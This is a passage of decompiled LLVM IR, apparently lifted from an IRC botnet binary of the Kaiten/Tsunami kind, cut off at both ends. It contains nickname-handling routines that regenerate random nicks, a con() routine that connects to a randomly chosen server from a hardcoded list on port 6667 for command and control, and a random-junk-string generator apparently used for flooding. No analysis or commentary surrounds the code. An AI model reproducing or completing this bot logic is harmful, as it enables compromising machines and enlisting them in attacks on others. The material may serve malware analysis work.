dec_label_pc_1b5c0.dec_label_pc_1b5f4_crit_edge:  ; preds = %dec_label_pc_1b5c0
  %.pre27 = add i32 %storemerge10, %v1_1b570
  %.pre28 = inttoptr i32 %.pre27 to i8*
  br label %dec_label_pc_1b5f4

dec_label_pc_1b5d8:                               ; preds = %dec_label_pc_1b5c0
  %v2_1b5e4 = add i32 %storemerge10, %v1_1b570
  %v1_1b5e8 = inttoptr i32 %v2_1b5e4 to i8*
  %v2_1b5e8 = load i8, i8* %v1_1b5e8, align 1
  %v7_1b5ec = icmp eq i8 %v2_1b5e8, 32
  br i1 %v7_1b5ec, label %dec_label_pc_1b5f4, label %dec_label_pc_1b5b4

dec_label_pc_1b5f4:                               ; preds = %dec_label_pc_1b5d8, %dec_label_pc_1b5c0.dec_label_pc_1b5f4_crit_edge
  %v3_1b608.pre-phi = phi i8* [ %.pre28, %dec_label_pc_1b5c0.dec_label_pc_1b5f4_crit_edge ], [ %v1_1b5e8, %dec_label_pc_1b5d8 ]
  store i8 0, i8* %v3_1b608.pre-phi, align 1
  %v2_1b610 = load i32, i32* @global_var_52594.89, align 4
  %v4_1b61c = call i32 @__GI_strcasecmp(i8* %v5_1b574, i32 %v2_1b610)
  %v2_1b624 = icmp eq i32 %v4_1b61c, 0
  br i1 %v2_1b624, label %dec_label_pc_1b62c, label %dec_label_pc_1b80c

dec_label_pc_1b62c:                               ; preds = %dec_label_pc_1b5f4
  %v2_1b630 = load i32, i32* @global_var_49b44.49, align 4
  %v2_1b634 = icmp eq i32 %v2_1b630, 0
  br i1 %v2_1b634, label %dec_label_pc_1b63c, label %dec_label_pc_1b80c

dec_label_pc_1b63c:                               ; preds = %dec_label_pc_1b62c
  br label %dec_label_pc_1b670.preheader

dec_label_pc_1b658:                               ; preds = %dec_label_pc_1b688
  %v1_1b65c = add i32 %.pre29, 1
  %v5_1b660 = inttoptr i32 %v1_1b65c to i8*
  %v1_1b668 = add i32 %stack_var_-40.2, 1
  br label %dec_label_pc_1b670

dec_label_pc_1b670:                               ; preds = %dec_label_pc_1b670.preheader, %dec_label_pc_1b658
  %stack_var_-32.2 = phi i8* [ %v5_1b660, %dec_label_pc_1b658 ], [ %stack_var_-32.316, %dec_label_pc_1b670.preheader ]
  %stack_var_-40.2 = phi i32 [ %v1_1b668, %dec_label_pc_1b658 ], [ %stack_var_-40.317, %dec_label_pc_1b670.preheader ]
  %v3_1b678 = call i32 @strlen(i8* %arg3)
  %v3_1b680 = icmp ult i32 %stack_var_-40.2, %v3_1b678
  %.pre29 = ptrtoint i8* %stack_var_-32.2 to i32
  br i1 %v3_1b680, label %dec_label_pc_1b688, label %dec_label_pc_1b698

dec_label_pc_1b688:                               ; preds = %dec_label_pc_1b670
  %v2_1b68c = load i8, i8* %stack_var_-32.2, align 1
  %v7_1b690 = icmp eq i8 %v2_1b68c, 32
  br i1 %v7_1b690, label %dec_label_pc_1b698, label %dec_label_pc_1b658

dec_label_pc_1b698:                               ; preds = %dec_label_pc_1b670, %dec_label_pc_1b688
  %v1_1b69c = add i32 %.pre29, 1
  %v3_1b6ac = call i32 @strlen(i8* %arg3)
  %v9_1b6b4 = icmp eq i32 %stack_var_-40.2, %v3_1b6ac
  br i1 %v9_1b6b4, label %dec_label_pc_1b80c, label %dec_label_pc_1b6bc

dec_label_pc_1b6bc:                               ; preds = %dec_label_pc_1b698
  %v5_1b6a0 = inttoptr i32 %v1_1b69c to i8*
  %v1_1b6c0 = add nuw nsw i32 %storemerge1118, 1
  %v7_1b6d0 = icmp slt i32 %v1_1b6c0, 3
  br i1 %v7_1b6d0, label %dec_label_pc_1b670.preheader, label %dec_label_pc_1b6ec

dec_label_pc_1b670.preheader:                     ; preds = %dec_label_pc_1b63c, %dec_label_pc_1b6bc
  %storemerge1118 = phi i32 [ 0, %dec_label_pc_1b63c ], [ %v1_1b6c0, %dec_label_pc_1b6bc ]
  %stack_var_-40.317 = phi i32 [ 0, %dec_label_pc_1b63c ], [ %stack_var_-40.2, %dec_label_pc_1b6bc ]
  %stack_var_-32.316 = phi i8* [ %arg3, %dec_label_pc_1b63c ], [ %v5_1b6a0, %dec_label_pc_1b6bc ]
  br label %dec_label_pc_1b670

dec_label_pc_1b6e0:                               ; preds = %dec_label_pc_1b704
  %v1_1b6e4 = add i32 %storemerge12, 1
  br label %dec_label_pc_1b6ec

dec_label_pc_1b6ec:                               ; preds = %dec_label_pc_1b6bc, %dec_label_pc_1b6e0
  %storemerge12 = phi i32 [ %v1_1b6e4, %dec_label_pc_1b6e0 ], [ 0, %dec_label_pc_1b6bc ]
  store i32 %storemerge12, i32* @r4, align 4
  %v3_1b6f4 = call i32 @strlen(i8* %v5_1b6a0)
  %v0_1b6fc = load i32, i32* @r4, align 4
  %v3_1b6fc = icmp ult i32 %v0_1b6fc, %v3_1b6f4
  br i1 %v3_1b6fc, label %dec_label_pc_1b704, label %dec_label_pc_1b6ec.dec_label_pc_1b720_crit_edge

dec_label_pc_1b6ec.dec_label_pc_1b720_crit_edge:  ; preds = %dec_label_pc_1b6ec
  %.pre30 = add i32 %storemerge12, %v1_1b69c
  %.pre31 = inttoptr i32 %.pre30 to i8*
  br label %dec_label_pc_1b720

dec_label_pc_1b704:                               ; preds = %dec_label_pc_1b6ec
  %v2_1b710 = add i32 %storemerge12, %v1_1b69c
  %v1_1b714 = inttoptr i32 %v2_1b710 to i8*
  %v2_1b714 = load i8, i8* %v1_1b714, align 1
  %v7_1b718 = icmp eq i8 %v2_1b714, 32
  br i1 %v7_1b718, label %dec_label_pc_1b720, label %dec_label_pc_1b6e0

dec_label_pc_1b720:                               ; preds = %dec_label_pc_1b704, %dec_label_pc_1b6ec.dec_label_pc_1b720_crit_edge
  %v3_1b734.pre-phi = phi i8* [ %.pre31, %dec_label_pc_1b6ec.dec_label_pc_1b720_crit_edge ], [ %v1_1b714, %dec_label_pc_1b704 ]
  store i8 0, i8* %v3_1b734.pre-phi, align 1
  store i32 %v1_1b69c, i32* @r0, align 4
  %v2_1b73c = call i32 @inet_addr(i32 %v1_1b69c)
  %v5_1b744 = trunc i32 %v2_1b73c to i8
  store i8 %v5_1b744, i8* %stack_var_-44, align 1
  %v3_1b74c = icmp eq i8 %v5_1b744, -1
  br i1 %v3_1b74c, label %dec_label_pc_1b754, label %dec_label_pc_1b7b0

dec_label_pc_1b754:                               ; preds = %dec_label_pc_1b720
  store i32 %v1_1b69c, i32* @r0, align 4
  %v2_1b758 = call i32 @__GI_gethostbyname(i32 %v1_1b69c)
  %v2_1b768 = icmp eq i32 %v2_1b758, 0
  br i1 %v2_1b768, label %dec_label_pc_1b770, label %dec_label_pc_1b78c

dec_label_pc_1b770:                               ; preds = %dec_label_pc_1b754
  %v2_1b774 = load i32, i32* @global_var_53710.671, align 4
  store i32 %v2_1b774, i32* @r2, align 4
  %v3_1b784 = call i32 @Send(i32 %arg1, i32 ptrtoint ([93 x i8]* @global_var_3ab04.1125 to i32))
  br label %dec_label_pc_1b80c

dec_label_pc_1b78c:                               ; preds = %dec_label_pc_1b754
  %v1_1b790 = add i32 %v2_1b758, 16
  %v2_1b790 = inttoptr i32 %v1_1b790 to i32*
  %v3_1b790 = load i32, i32* %v2_1b790, align 4
  %v1_1b794 = inttoptr i32 %v3_1b790 to i32*
  %v2_1b794 = load i32, i32* %v1_1b794, align 4
  store i32 %v2_1b794, i32* @r1, align 4
  %v1_1b79c = add i32 %v2_1b758, 12
  %v2_1b79c = inttoptr i32 %v1_1b79c to i32*
  %v3_1b79c = load i32, i32* %v2_1b79c, align 4
  store i32 %v3_1b79c, i32* @r2, align 4
  %v2_1b7a4 = ptrtoint i8* %stack_var_-44 to i32
  store i32 %v2_1b7a4, i32* @r3, align 4
  store i32 %v2_1b7a4, i32* @r0, align 4
  %v0_1b7ac = call i32 @memcpy()
  %v2_1b7bc.pre = load i8, i8* %stack_var_-44, align 1
  br label %dec_label_pc_1b7b0

dec_label_pc_1b7b0:                               ; preds = %dec_label_pc_1b720, %dec_label_pc_1b78c
  %v1_1b81426 = phi i32 [ %v0_1b7ac, %dec_label_pc_1b78c ], [ %v2_1b73c, %dec_label_pc_1b720 ]
  %v2_1b7bc = phi i8 [ %v2_1b7bc.pre, %dec_label_pc_1b78c ], [ %v5_1b744, %dec_label_pc_1b720 ]
  store i8 %v2_1b7bc, i8* bitcast (i8** @global_var_49b43.1127 to i8*), align 4
  store i8 0, i8* bitcast (i8** @global_var_49b40.47 to i8*), align 4
  store i32 256, i32* @global_var_49b44.49, align 4
  br label %dec_label_pc_1b80c

dec_label_pc_1b80c:                               ; preds = %dec_label_pc_1b56c, %dec_label_pc_1b698, %dec_label_pc_1b62c, %dec_label_pc_1b5f4, %dec_label_pc_1b770, %dec_label_pc_1b7b0
  %v1_1b814 = phi i32 [ 0, %dec_label_pc_1b62c ], [ %v4_1b61c, %dec_label_pc_1b5f4 ], [ %v3_1b784, %dec_label_pc_1b770 ], [ %v1_1b81426, %dec_label_pc_1b7b0 ], [ %v3_1b6ac, %dec_label_pc_1b698 ], [ %v3_1b580, %dec_label_pc_1b56c ]
  ret i32 %v1_1b814

; uselistorder directives
  uselistorder i32 %storemerge12, { 1, 0, 3, 2 }
  uselistorder i32 %v1_1b6c0, { 1, 0 }
  uselistorder i32 %v1_1b69c, { 3, 2, 5, 4, 0, 1, 6 }
  uselistorder i32 %stack_var_-40.2, { 2, 0, 1, 3 }
  uselistorder i8* %stack_var_-32.2, { 1, 0 }
  uselistorder i32 %storemerge10, { 1, 0, 3, 2 }
  uselistorder i32 %v1_1b594, { 1, 0 }
  uselistorder i32 %stack_var_-40.0, { 2, 0, 1, 3 }
  uselistorder i8* %stack_var_-32.0, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8** @global_var_49b40.47, { 0, 1, 4, 3, 2 }
  uselistorder i32* @global_var_49b44.49, { 0, 3, 1, 2, 4, 5, 6 }
  uselistorder i8* %arg3, { 1, 2, 3, 0, 4, 5 }
  uselistorder label %dec_label_pc_1b80c, { 5, 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_1b7b0, { 1, 0 }
  uselistorder label %dec_label_pc_1b6ec, { 1, 0 }
  uselistorder label %dec_label_pc_1b670.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1b698, { 1, 0 }
  uselistorder label %dec_label_pc_1b5c0, { 1, 0 }
  uselistorder label %dec_label_pc_1b544.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1b56c, { 1, 0 }
}

define i32 @_433(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 112696, i32* %stack_var_-4, align 4
  %v2_1b834 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_1b834, i32* @fp, align 4
  %v2_1b84c = load i32, i32* @global_var_52594.89, align 4
  store i32 %v2_1b84c, i32* @r0, align 4
  %v0_1b854 = call i32 @free()
  %v2_1b860 = call i32 @realrand(i32 4, i32 8)
  %v1_1b86c = call i32 @randstring(i32 %v2_1b860)
  store i32 %v1_1b86c, i32* @global_var_52594.89, align 4
  ret i32 %v1_1b86c

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @_NICK(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg3 to i8*
  %tmp6 = ptrtoint i8* %arg2 to i32
  %stack_var_-4 = alloca i32, align 4
  store i32 112792, i32* %stack_var_-4, align 4
  %v2_1b894 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_1b894, i32* @fp, align 4
  br label %dec_label_pc_1b8c0

dec_label_pc_1b8b4:                               ; preds = %dec_label_pc_1b8d8
  %v1_1b8b8 = add i32 %storemerge3, 1
  br label %dec_label_pc_1b8c0

dec_label_pc_1b8c0:                               ; preds = %entry, %dec_label_pc_1b8b4
  %storemerge3 = phi i32 [ 0, %entry ], [ %v1_1b8b8, %dec_label_pc_1b8b4 ]
  store i32 %storemerge3, i32* @r4, align 4
  %v3_1b8c8 = call i32 @strlen(i8* %arg2)
  %v0_1b8d0 = load i32, i32* @r4, align 4
  %v3_1b8d0 = icmp ult i32 %v0_1b8d0, %v3_1b8c8
  br i1 %v3_1b8d0, label %dec_label_pc_1b8d8, label %dec_label_pc_1b8c0.dec_label_pc_1b8f4_crit_edge

dec_label_pc_1b8c0.dec_label_pc_1b8f4_crit_edge:  ; preds = %dec_label_pc_1b8c0
  %.pre = add i32 %storemerge3, %tmp6
  %.pre5 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_1b8f4

dec_label_pc_1b8d8:                               ; preds = %dec_label_pc_1b8c0
  %v2_1b8e4 = add i32 %storemerge3, %tmp6
  %v1_1b8e8 = inttoptr i32 %v2_1b8e4 to i8*
  %v2_1b8e8 = load i8, i8* %v1_1b8e8, align 1
  %v7_1b8ec = icmp eq i8 %v2_1b8e8, 33
  br i1 %v7_1b8ec, label %dec_label_pc_1b8f4, label %dec_label_pc_1b8b4

dec_label_pc_1b8f4:                               ; preds = %dec_label_pc_1b8d8, %dec_label_pc_1b8c0.dec_label_pc_1b8f4_crit_edge
  %v3_1b908.pre-phi = phi i8* [ %.pre5, %dec_label_pc_1b8c0.dec_label_pc_1b8f4_crit_edge ], [ %v1_1b8e8, %dec_label_pc_1b8d8 ]
  store i8 0, i8* %v3_1b908.pre-phi, align 1
  %v2_1b910 = load i32, i32* @global_var_52594.89, align 4
  %v4_1b91c = call i32 @__GI_strcasecmp(i8* %arg2, i32 %v2_1b910)
  %v2_1b924 = icmp eq i32 %v4_1b91c, 0
  br i1 %v2_1b924, label %dec_label_pc_1b92c, label %dec_label_pc_1b98c

dec_label_pc_1b92c:                               ; preds = %dec_label_pc_1b8f4
  %v2_1b930 = load i8, i8* %tmp, align 1
  %v7_1b934 = icmp eq i8 %v2_1b930, 58
  br i1 %v7_1b934, label %dec_label_pc_1b93c, label %dec_label_pc_1b948

dec_label_pc_1b93c:                               ; preds = %dec_label_pc_1b92c
  br label %dec_label_pc_1b948

dec_label_pc_1b948:                               ; preds = %dec_label_pc_1b92c, %dec_label_pc_1b93c
  %v2_1b94c = load i32, i32* @global_var_52594.89, align 4
  %v2_1b950 = icmp eq i32 %v2_1b94c, 0
  br i1 %v2_1b950, label %dec_label_pc_1b968, label %dec_label_pc_1b958

dec_label_pc_1b958:                               ; preds = %dec_label_pc_1b948
  store i32 %v2_1b94c, i32* @r0, align 4
  %v0_1b964 = call i32 @free()
  br label %dec_label_pc_1b968

dec_label_pc_1b968:                               ; preds = %dec_label_pc_1b948, %dec_label_pc_1b958
  %v2_1b970 = call i32 @realrand(i32 4, i32 8)
  %v1_1b97c = call i32 @randstring(i32 %v2_1b970)
  store i32 %v1_1b97c, i32* @global_var_52594.89, align 4
  br label %dec_label_pc_1b98c

dec_label_pc_1b98c:                               ; preds = %dec_label_pc_1b8f4, %dec_label_pc_1b968
  %v1_1b994 = phi i32 [ %v4_1b91c, %dec_label_pc_1b8f4 ], [ %v1_1b97c, %dec_label_pc_1b968 ]
  ret i32 %v1_1b994

; uselistorder directives
  uselistorder i32 %storemerge3, { 1, 0, 3, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_1b98c, { 1, 0 }
  uselistorder label %dec_label_pc_1b968, { 1, 0 }
  uselistorder label %dec_label_pc_1b948, { 1, 0 }
  uselistorder label %dec_label_pc_1b8c0, { 1, 0 }
}

define i32 @con() local_unnamed_addr {
entry:
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_1b9a0 = load i32, i32* @fp, align 4
  store i32 113064, i32* %stack_var_-4, align 4
  %v2_1b9a4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_1b9a4, i32* @fp, align 4
  store i32 0, i32* %stack_var_-36, align 4
  store i32 4, i32* %stack_var_-40, align 4
  %v2_1b9c0 = load i32, i32* @global_var_52598.39, align 4
  %v2_1b9c4 = ptrtoint i32* %stack_var_-36 to i32
  %v2_1b9c8 = ptrtoint i32* %stack_var_-40 to i32
  %v5_1b9e0 = call i32 @getsockopt(i32 %v2_1b9c0, i32 1, i32 4, i32 %v2_1b9c4, i32 %v2_1b9c8)
  %v2_1b9f0 = icmp eq i32 %v5_1b9e0, 0
  br i1 %v2_1b9f0, label %dec_label_pc_1b9f8, label %dec_label_pc_1ba04.preheader

dec_label_pc_1b9f8:                               ; preds = %entry
  %v3_1b9f8 = load i32, i32* %stack_var_-36, align 4
  %v2_1b9fc = icmp eq i32 %v3_1b9f8, 0
  br i1 %v2_1b9fc, label %dec_label_pc_1bcd0, label %dec_label_pc_1ba04.preheader

dec_label_pc_1ba04.preheader:                     ; preds = %dec_label_pc_1b9f8, %entry
  %v2_1bb2c = ptrtoint i32* %stack_var_-52 to i32
  %v2_1bb7c = ptrtoint i32* %stack_var_-60 to i32
  %v2_1bbbc = ptrtoint i32* %stack_var_-56 to i32
  br label %dec_label_pc_1ba04

dec_label_pc_1ba04:                               ; preds = %dec_label_pc_1ba04.backedge, %dec_label_pc_1ba04.preheader
  store i32 -1, i32* @global_var_52598.39, align 4
  store i32 1, i32* %stack_var_-60, align 4
  %v2_1ba1c = load i32, i32* @global_var_49b38.910, align 4
  %v2_1ba20 = icmp eq i32 %v2_1ba1c, 0
  br i1 %v2_1ba20, label %dec_label_pc_1ba28, label %dec_label_pc_1ba5c

dec_label_pc_1ba28:                               ; preds = %dec_label_pc_1ba04
  %v0_1ba28 = call i32 @rand()
  %v2_1ba34 = load i32, i32* @global_var_44ac8.1135, align 4
  %v3_1ba40 = urem i32 %v0_1ba28, %v2_1ba34
  %v4_1ba50 = mul i32 %v3_1ba40, 4
  %v5_1ba50 = add i32 %v4_1ba50, ptrtoint ([14 x i8]** @global_var_44acc.1138 to i32)
  %v6_1ba50 = inttoptr i32 %v5_1ba50 to i32*
  %v7_1ba50 = load i32, i32* %v6_1ba50, align 4
  store i32 %v7_1ba50, i32* @global_var_526c0.908, align 4
  br label %dec_label_pc_1ba5c

dec_label_pc_1ba5c:                               ; preds = %dec_label_pc_1ba04, %dec_label_pc_1ba28
  store i32 0, i32* @global_var_49b38.910, align 4
  br label %dec_label_pc_1ba68

dec_label_pc_1ba68:                               ; preds = %dec_label_pc_1ba68, %dec_label_pc_1ba5c
  %v3_1ba74 = call i32 @socket(i32 2, i32 1, i32 6)
  store i32 %v3_1ba74, i32* @global_var_52598.39, align 4
  %v1_1ba8c = icmp slt i32 %v3_1ba74, 0
  br i1 %v1_1ba8c, label %dec_label_pc_1ba68, label %dec_label_pc_1ba94

dec_label_pc_1ba94:                               ; preds = %dec_label_pc_1ba68
  %v2_1ba98 = load i32, i32* @global_var_526c0.908, align 4
  store i32 %v2_1ba98, i32* @r0, align 4
  %v1_1baa0 = call i32 @inet_addr(i32 %v2_1ba98)
  %v2_1baa8 = icmp eq i32 %v1_1baa0, 0
  br i1 %v2_1baa8, label %dec_label_pc_1bacc, label %dec_label_pc_1bab0

dec_label_pc_1bab0:                               ; preds = %dec_label_pc_1ba94
  %v2_1bab4 = load i32, i32* @global_var_526c0.908, align 4
  store i32 %v2_1bab4, i32* @r0, align 4
  %v1_1babc = call i32 @inet_addr(i32 %v2_1bab4)
  %v3_1bac4 = icmp eq i32 %v1_1babc, -1
  br i1 %v3_1bac4, label %dec_label_pc_1bacc, label %dec_label_pc_1bb40

dec_label_pc_1bacc:                               ; preds = %dec_label_pc_1bab0, %dec_label_pc_1ba94
  %v2_1bad0 = load i32, i32* @global_var_526c0.908, align 4
  store i32 %v2_1bad0, i32* @r0, align 4
  %v1_1bad8 = call i32 @__GI_gethostbyname(i32 %v2_1bad0)
  %v2_1bae8 = icmp eq i32 %v1_1bad8, 0
  br i1 %v2_1bae8, label %dec_label_pc_1baf0, label %dec_label_pc_1bb10

dec_label_pc_1baf0:                               ; preds = %dec_label_pc_1bacc
  store i32 0, i32* @global_var_526c0.908, align 4
  %v2_1bb00 = load i32, i32* @global_var_52598.39, align 4
  %v1_1bb08 = call i32 @close(i32 %v2_1bb00)
  br label %dec_label_pc_1ba04.backedge

dec_label_pc_1ba04.backedge:                      ; preds = %dec_label_pc_1baf0, %dec_label_pc_1bcb0
  br label %dec_label_pc_1ba04

dec_label_pc_1bb10:                               ; preds = %dec_label_pc_1bacc
  %v1_1bb14 = add i32 %v1_1bad8, 16
  %v2_1bb14 = inttoptr i32 %v1_1bb14 to i32*
  %v3_1bb14 = load i32, i32* %v2_1bb14, align 4
  %v1_1bb18 = inttoptr i32 %v3_1bb14 to i32*
  %v2_1bb18 = load i32, i32* %v1_1bb18, align 4
  %v1_1bb20 = add i32 %v1_1bad8, 12
  %v2_1bb20 = inttoptr i32 %v1_1bb20 to i32*
  %v3_1bb20 = load i32, i32* %v2_1bb20, align 4
  store i32 %v3_1bb20, i32* @r2, align 4
  store i32 %v2_1bb2c, i32* @r3, align 4
  %v3_1bb38 = call i32 @bcopy(i32 %v2_1bb18, i32 %v2_1bb2c, i32 %v3_1bb20)
  br label %dec_label_pc_1bb58

dec_label_pc_1bb40:                               ; preds = %dec_label_pc_1bab0
  %v2_1bb44 = load i32, i32* @global_var_526c0.908, align 4
  store i32 %v2_1bb44, i32* @r0, align 4
  %v1_1bb4c = call i32 @inet_addr(i32 %v2_1bb44)
  store i32 %v1_1bb4c, i32* %stack_var_-52, align 4
  br label %dec_label_pc_1bb58

dec_label_pc_1bb58:                               ; preds = %dec_label_pc_1bb10, %dec_label_pc_1bb40
  store i32 2, i32* %stack_var_-56, align 4
  %v1_1bb68 = call i32 @__GI_htons(i32 6667)
  %v2_1bb78 = load i32, i32* @global_var_52598.39, align 4
  store i32 %v2_1bb78, i32* @r3, align 4
  %v3_1bb8c = call i32 @ioctl(i32 %v2_1bb78, i32 21537, i32 %v2_1bb7c)
  %v2_1bb94 = call i32 @__GI_time(i32* null)
  br label %dec_label_pc_1bc90

dec_label_pc_1bba4:                               ; preds = %dec_label_pc_1bc90
  %v0_1bba4 = call i32 @__errno_location()
  %v2_1bbb0 = inttoptr i32 %v0_1bba4 to i32*
  store i32 0, i32* %v2_1bbb0, align 4
  %v2_1bbb8 = load i32, i32* @global_var_52598.39, align 4
  %v3_1bbcc = call i32 @connect(i32 %v2_1bbb8, i32 %v2_1bbbc, i32 16)
  %v2_1bbd4 = icmp eq i32 %v3_1bbcc, 0
  br i1 %v2_1bbd4, label %dec_label_pc_1bbf0, label %dec_label_pc_1bbdc

dec_label_pc_1bbdc:                               ; preds = %dec_label_pc_1bba4
  %v0_1bbdc = call i32 @__errno_location()
  %v1_1bbe4 = inttoptr i32 %v0_1bbdc to i32*
  %v2_1bbe4 = load i32, i32* %v1_1bbe4, align 4
  %v7_1bbe8 = icmp eq i32 %v2_1bbe4, 106
  br i1 %v7_1bbe8, label %dec_label_pc_1bbf0, label %dec_label_pc_1bc60

dec_label_pc_1bbf0:                               ; preds = %dec_label_pc_1bbdc, %dec_label_pc_1bba4
  %v2_1bbf4 = load i32, i32* @global_var_52598.39, align 4
  %v5_1bc10 = call i32 @__GI_setsockopt(i32 %v2_1bbf4, i32 1, i32 13, i32 0, i32 0)
  %v2_1bc18 = load i32, i32* @global_var_52598.39, align 4
  %v5_1bc34 = call i32 @__GI_setsockopt(i32 %v2_1bc18, i32 1, i32 2, i32 0, i32 0)
  %v2_1bc3c = load i32, i32* @global_var_52598.39, align 4
  %v5_1bc58 = call i32 @__GI_setsockopt(i32 %v2_1bc3c, i32 1, i32 9, i32 0, i32 0)
  br label %dec_label_pc_1bcd0

dec_label_pc_1bc60:                               ; preds = %dec_label_pc_1bbdc
  %v0_1bc60 = call i32 @__errno_location()
  %v1_1bc68 = inttoptr i32 %v0_1bc60 to i32*
  %v2_1bc68 = load i32, i32* %v1_1bc68, align 4
  %v7_1bc6c = icmp eq i32 %v2_1bc68, 115
  br i1 %v7_1bc6c, label %dec_label_pc_1bc88, label %dec_label_pc_1bc74

dec_label_pc_1bc74:                               ; preds = %dec_label_pc_1bc60
  %v0_1bc74 = call i32 @__errno_location()
  %v1_1bc7c = inttoptr i32 %v0_1bc74 to i32*
  %v2_1bc7c = load i32, i32* %v1_1bc7c, align 4
  %v7_1bc80 = icmp eq i32 %v2_1bc7c, 114
  br i1 %v7_1bc80, label %dec_label_pc_1bc88, label %dec_label_pc_1bcb0

dec_label_pc_1bc88:                               ; preds = %dec_label_pc_1bc74, %dec_label_pc_1bc60
  %v1_1bc8c = call i32 @sleep(i32 1)
  br label %dec_label_pc_1bc90

dec_label_pc_1bc90:                               ; preds = %dec_label_pc_1bb58, %dec_label_pc_1bc88
  %v2_1bc94 = call i32 @__GI_time(i32* null)
  %v2_1bca4 = sub i32 %v2_1bc94, %v2_1bb94
  %tmp = icmp ult i32 %v2_1bca4, 10
  br i1 %tmp, label %dec_label_pc_1bba4, label %dec_label_pc_1bcb0

dec_label_pc_1bcb0:                               ; preds = %dec_label_pc_1bc74, %dec_label_pc_1bc90
  store i32 0, i32* @global_var_526c0.908, align 4
  %v2_1bcc0 = load i32, i32* @global_var_52598.39, align 4
  %v1_1bcc8 = call i32 @close(i32 %v2_1bcc0)
  br label %dec_label_pc_1ba04.backedge

dec_label_pc_1bcd0:                               ; preds = %dec_label_pc_1b9f8, %dec_label_pc_1bbf0
  %v1_1bcd8 = phi i32 [ 0, %dec_label_pc_1b9f8 ], [ %v5_1bc58, %dec_label_pc_1bbf0 ]
  store i32 %v3_1b9a0, i32* @fp, align 4
  ret i32 %v1_1bcd8

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-36, { 0, 2, 1 }
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32 114, { 2, 0, 1 }
  uselistorder i32 115, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32 (i32, i32, i32)* @connect, { 8, 7, 6, 10, 9, 5, 4, 2, 1, 3, 0 }
  uselistorder i32 (i32)* @__GI_htons, { 64, 63, 62, 66, 61, 65, 60, 59, 9, 8, 7, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 4, 3, 2, 1, 0, 6, 5 }
  uselistorder i32 (i32, i32, i32)* @bcopy, { 7, 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32)* @__GI_gethostbyname, { 8, 7, 6, 5, 4, 1, 3, 2, 0 }
  uselistorder i32 (i32)* @inet_addr, { 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 0, 2, 1 }
  uselistorder i32* @global_var_49b38.910, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @getsockopt, { 3, 5, 4, 2, 1, 0 }
  uselistorder label %dec_label_pc_1bcd0, { 1, 0 }
  uselistorder label %dec_label_pc_1bcb0, { 1, 0 }
  uselistorder label %dec_label_pc_1bc90, { 1, 0 }
  uselistorder label %dec_label_pc_1bb58, { 1, 0 }
  uselistorder label %dec_label_pc_1ba04.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_1ba5c, { 1, 0 }
}

define i32 @makeFukdString(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_1bcf4 = load i32, i32* @r4, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_1bd0c = call i32 @__GI_time(i32* null)
  store i32 %v2_1bd0c, i32* %r0.global-to-local, align 4
  %v1_1bd18 = call i32 @srand(i32 %v2_1bd0c)
  store i32 %v1_1bd18, i32* %r0.global-to-local, align 4
  %v5_1bdb019 = icmp sgt i32 %arg2, 0
  br i1 %v5_1bdb019, label %dec_label_pc_1bd30, label %dec_label_pc_1bdb4

dec_label_pc_1bd30:                               ; preds = %entry, %dec_label_pc_1bd30
  %storemerge120 = phi i32 [ %v1_1bd9c, %dec_label_pc_1bd30 ], [ 0, %entry ]
  %v2_1bd3c = add i32 %storemerge120, %arg1
  store i32 %v2_1bd3c, i32* @r4, align 4
  %v0_1bd40 = call i32 @rand()
  store i32 %v0_1bd40, i32* %r0.global-to-local, align 4
  %v2_1bd5c = sdiv i32 %v0_1bd40, 49
  %tmp12 = mul i32 %v2_1bd5c, -223
  %v2_1bd7c = add i32 %tmp12, %v0_1bd40
  %fold = add i32 %v2_1bd7c, 33
  %v1_1bd94 = trunc i32 %fold to i8
  %v2_1bd94 = load i32, i32* @r4, align 4
  %v3_1bd94 = inttoptr i32 %v2_1bd94 to i8*
  store i8 %v1_1bd94, i8* %v3_1bd94, align 1
  %v1_1bd9c = add nuw nsw i32 %storemerge120, 1
  %v5_1bdb0 = icmp slt i32 %v1_1bd9c, %arg2
  br i1 %v5_1bdb0, label %dec_label_pc_1bd30, label %dec_label_pc_1bda4.dec_label_pc_1bdb4_crit_edge

dec_label_pc_1bda4.dec_label_pc_1bdb4_crit_edge:  ; preds = %dec_label_pc_1bd30
  %v1_1bdbc.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1bdb4

dec_label_pc_1bdb4:                               ; preds = %dec_label_pc_1bda4.dec_label_pc_1bdb4_crit_edge, %entry
